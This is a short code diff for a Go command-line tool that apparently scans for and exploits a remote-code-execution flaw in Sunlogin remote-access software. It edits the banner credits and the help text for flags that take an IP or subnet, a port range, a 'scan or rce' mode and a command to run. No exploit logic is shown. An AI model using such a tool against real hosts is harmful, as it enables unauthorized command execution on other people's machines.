@@ -12,24 +12,24 @@ import (
 
 func init() {
 	logo := `
-
 ╔═╗┬ ┬┌┐┌╦  ┌─┐┌─┐┬┌┐┌   ╦═╗┌─┐┌─┐
 ╚═╗│ ││││║  │ ││ ┬││││───╠╦╝│  ├┤ 
 ╚═╝└─┘┘└┘╩═╝└─┘└─┘┴┘└┘   ╩╚═└─┘└─┘
 
-						by:T00ls.net
-						向日葵Rce
+                      by:T00ls.net
+                      modified:forTheBest12138
+                      向日葵Rce
 ----------------------------------------------
 `
 	fmt.Println(logo)
-
 }
+
 func main() {
-	ip := flag.String("h", "", "ip")
+	ip := flag.String("h", "", "ip:10.0.0.1 or 10.0.0.1/24")
 	port := flag.String("p", "40000-65535", "port:40000-65535")
-	runtype := flag.String("t", "scan", "type")
+	runtype := flag.String("t", "scan", "scan or rce")
 	cmdstr := flag.String("c", "", "cmd")
-	x := flag.Int("x", 1000, "x")
+	x := flag.Int("x", 1000, "set thread count")
 	flag.Parse()
 	if *ip != "" {
 		switch *runtype {
